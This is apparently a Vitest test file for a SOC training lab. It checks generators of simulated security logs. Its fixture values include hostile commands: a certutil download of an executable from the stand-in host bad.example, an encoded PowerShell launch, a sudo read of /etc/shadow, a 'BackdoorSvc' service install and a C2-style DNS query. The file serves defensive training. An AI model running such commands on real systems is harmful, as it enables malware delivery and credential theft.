import { describe, it, expect } from "vitest";
import {
  generateEmailGatewayLog,
  generateProxyDnsLog,
  generateFirewallFlowLog,
  generateWindowsSecurityLog,
  generateLinuxAuthLog,
  generateWebServerAccessLog,
  generateVpnIdpLog,
  generateCloudAuditLog,
  generateEdrTelemetry,
  GOLDEN_LOG_SAMPLES,
} from "@/lib/lab-engine/soc/log-formats";

describe("SOC Log Formats Module", () => {
  it("formats Email Gateway logs correctly with SPF/DKIM/DMARC", () => {
    const log = generateEmailGatewayLog({
      timestamp: "2026-10-12T08:00:00.000Z",
      sender: "alert@phishing.example",
      recipient: "victim@corp.internal",
      clientIp: "198.51.100.10",
      subject: "Urgent Payment Needed",
      spfResult: "fail",
      dkimResult: "none",
      dmarcVerdict: "fail",
      extractedUrls: ["https://phishing.example/login"],
      verdict: "delivered",
    });

    expect(log.source).toBe("EmailGateway");
    expect(log.action).toBe("email_delivered");
    expect(log.message).toContain("SPF:FAIL");
    expect(log.message).toContain("DKIM:NONE");
    expect(log.fields.spf_result).toBe("fail");
    expect(log.fields.extracted_urls).toContain("phishing.example");
  });

  it("formats DNS and Web Proxy queries accurately", () => {
    const log = generateProxyDnsLog({
      timestamp: "2026-10-12T08:01:00.000Z",
      clientIp: "10.10.1.20",
      query: "tunnel.c2.test",
      recordType: "TXT",
      responseCode: "NOERROR",
      resolvedIps: ["198.51.100.50"],
    });

    expect(log.source).toBe("Network IDS");
    expect(log.message).toContain("type=TXT");
    expect(log.message).toContain("rcode=NOERROR");
    expect(log.fields.query).toBe("tunnel.c2.test");
  });

  it("formats Firewall allow/deny flow logs accurately", () => {
    const log = generateFirewallFlowLog({
      timestamp: "2026-10-12T08:02:00.000Z",
      action: "DENY",
      protocol: "TCP",
      srcIp: "203.0.113.88",
      srcPort: 44120,
      dstIp: "10.20.1.10",
      dstPort: 443,
      bytesSent: 120,
      bytesReceived: 0,
      packets: 2,
      ruleName: "WAN_IN_BLOCK",
    });

    expect(log.source).toBe("Firewall");
    expect(log.action).toBe("flow_deny");
    expect(log.message).toContain("FW[edge]: DENY TCP 203.0.113.88:44120");
    expect(log.fields.action).toBe("DENY");
  });

  it("formats Windows Security event IDs 4624, 4625, 4688, 7045 accurately", () => {
    const e4624 = generateWindowsSecurityLog({
      timestamp: "2026-10-12T08:03:00.000Z",
      eventId: 4624,
      computer: "ws-eng-01.apex.corp.internal",
      userName: "alex",
      logonType: 10,
      ipAddress: "198.51.100.99",
    });
    expect(e4624.fields.event_id).toBe(4624);
    expect(e4624.fields.logon_type).toBe(10);
    expect(e4624.message).toContain("successfully logged on");

    const e4625 = generateWindowsSecurityLog({
      timestamp: "2026-10-12T08:04:00.000Z",
      eventId: 4625,
      computer: "ws-eng-01.apex.corp.internal",
      userName: "alex",
    });
    expect(e4625.fields.event_id).toBe(4625);
    expect(e4625.fields.failure_reason).toBe("BadPassword");

    const e4688 = generateWindowsSecurityLog({
      timestamp: "2026-10-12T08:05:00.000Z",
      eventId: 4688,
      computer: "ws-eng-01.apex.corp.internal",
      newProcessName: "powershell.exe",
      commandLine: "powershell.exe -enc AAA=",
    });
    expect(e4688.fields.event_id).toBe(4688);
    expect(e4688.fields.process_name).toBe("powershell.exe");

    const e7045 = generateWindowsSecurityLog({
      timestamp: "2026-10-12T08:06:00.000Z",
      eventId: 7045,
      computer: "dc-01.apex.corp.internal",
      serviceName: "BackdoorSvc",
      serviceFileName: "C:\\Users\\Public\\svc.exe",
    });
    expect(e7045.fields.event_id).toBe(7045);
    expect(e7045.message).toContain("BackdoorSvc");
  });

  it("formats Linux auth.log sshd and sudo records accurately", () => {
    const sshAccepted = generateLinuxAuthLog({
      timestamp: "2026-10-12T08:07:00.000Z",
      hostname: "srv-stage-01",
      daemon: "sshd",
      action: "accepted_password",
      user: "root",
      sourceIp: "198.51.100.12",
      sourcePort: 55432,
    });
    expect(sshAccepted.message).toContain("Accepted password for root from 198.51.100.12");

    const sudoLog = generateLinuxAuthLog({
      timestamp: "2026-10-12T08:08:00.000Z",
      hostname: "srv-stage-01",
      daemon: "sudo",
      action: "sudo_command",
      user: "deploy",
      command: "/usr/bin/cat /etc/shadow",
    });
    expect(sudoLog.message).toContain("COMMAND=/usr/bin/cat /etc/shadow");
  });

  it("formats Web Server access logs in Combined format", () => {
    const webLog = generateWebServerAccessLog({
      timestamp: "12/Oct/2026:08:09:00 +0000",
      clientIp: "203.0.113.10",
      method: "POST",
      uri: "/api/v1/auth",
      statusCode: 200,
      bytesSent: 432,
    });
    expect(webLog.message).toContain('"POST /api/v1/auth HTTP/1.1" 200 432');
  });

  it("formats IdP/VPN and Cloud Audit logs accurately", () => {
    const vpn = generateVpnIdpLog({
      timestamp: "2026-10-12T08:10:00.000Z",
      userPrincipal: "elena@apex.corp.internal",
      event: "login_success",
      clientIp: "198.51.100.77",
      locationCity: "Toronto",
    });
    expect(vpn.fields.user).toBe("elena@apex.corp.internal");
    expect(vpn.fields.location_city).toBe("Toronto");

    const cloud = generateCloudAuditLog({
      timestamp: "2026-10-12T08:11:00.000Z",
      eventName: "AttachUserPolicy",
      eventSource: "iam.amazonaws.com",
      callerIdentity: "compromised-admin",
      callerType: "IAMUser",
      sourceIp: "198.51.100.22",
      requestParameters: { policyArn: "arn:aws:iam::aws:policy/AdministratorAccess" },
    });
    expect(cloud.fields.event_name).toBe("AttachUserPolicy");
    expect(cloud.fields.caller_identity).toBe("compromised-admin");
  });

  it("formats EDR telemetry events accurately", () => {
    const edr = generateEdrTelemetry({
      timestamp: "2026-10-12T08:12:00.000Z",
      hostName: "ws-fin-02",
      eventType: "process_creation",
      processName: "certutil.exe",
      processPath: "C:\\Windows\\System32\\certutil.exe",
      commandLine: "certutil.exe -urlcache -split -f http://bad.example/p.exe C:\\p.exe",
      parentProcess: "cmd.exe",
      sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    });
    expect(edr.fields.process_name).toBe("certutil.exe");
    expect(edr.fields.sha256).toBe("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
  });

  it("validates golden log samples integrity", () => {
    expect(GOLDEN_LOG_SAMPLES.emailDelivered.fields.spf_result).toBe("pass");
    expect(GOLDEN_LOG_SAMPLES.windowsLogonSuccess.fields.event_id).toBe(4624);
    expect(GOLDEN_LOG_SAMPLES.linuxSshdAccepted.message).toContain("Accepted password for root");
    expect(GOLDEN_LOG_SAMPLES.webServerAccess.fields.status_code).toBe(200);
  });
});
